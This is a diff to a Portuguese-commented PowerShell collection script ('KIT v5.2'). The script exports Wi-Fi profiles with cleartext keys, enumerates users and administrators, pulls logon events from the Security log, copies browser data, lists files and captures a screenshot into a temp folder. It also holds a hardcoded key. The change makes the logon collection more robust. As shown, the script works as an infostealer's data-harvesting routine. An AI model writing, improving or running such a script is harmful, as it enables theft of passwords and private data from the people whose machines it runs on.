@@ -1,4 +1,4 @@
-# ---------- KIT v5.1 – ZIP sem corrupção ----------
+# ---------- KIT v5.2 – correção log Security ----------
 $ErrorActionPreference = "Stop"
 $kit     = "$env:TEMP\kit"
 $key     = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
@@ -25,13 +25,22 @@ Write-Log "[INFO] Exportando perfis Wi-Fi..."
 Get-NetIPConfiguration | Out-File "$kit\netip.txt" -Encoding UTF8
 cmd /c "netsh wlan export profile key=clear folder=$kit"
 
-# 3) Contas & privilégios
+# 3) Contas & privilégios  (LINHA 32~36 CORRIGIDAS)
 Write-Log "[INFO] Listando usuários e admins..."
 Get-CimInstance Win32_UserAccount | Out-File "$kit\users.txt" -Encoding UTF8
 net localgroup administradores | Out-File "$kit\admins.txt" -Encoding UTF8
-Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -Max 200 -EA SilentlyContinue |
-    Select TimeCreated,Id,LevelDisplayName,Message |
-    Out-File "$kit\logons.txt" -Encoding UTF8
+
+# ---- NOVO BLOCO: só lê 4624 se log existir ----
+$secLog = Get-WinEvent -ListLog Security -EA SilentlyContinue
+if ($secLog -and $secLog.RecordCount) {
+    Write-Log "[INFO] Coletando logons (Security 4624)..."
+    Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -Max 200 -EA SilentlyContinue |
+        Select TimeCreated,Id,LevelDisplayName,Message |
+        Out-File "$kit\logons.txt" -Encoding UTF8
+} else {
+    Write-Log "[WARN] Log 'Security' indisponível (rode como Admin ou habilite audit)."
+    "Log Security não disponível" | Out-File "$kit\logons.txt" -Encoding UTF8
+}
 
 # 4) Navegadores
 Write-Log "[INFO] Copiando dados de navegadores..."
@@ -66,7 +75,7 @@ Get-ChildItem C:\ -Include $exts -Recurse -Depth 2 -EA SilentlyContinue |
     Select -First 10 FullName,Length,LastWriteTime |
     Export-Csv "$kit\top10.csv" -NoTypeInformation
 
-# 9) Screenshot (handle liberado)
+# 9) Screenshot
 Write-Log "[INFO] Tirando screenshot..."
 Add-Type -AssemblyName System.Windows.Forms
 $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
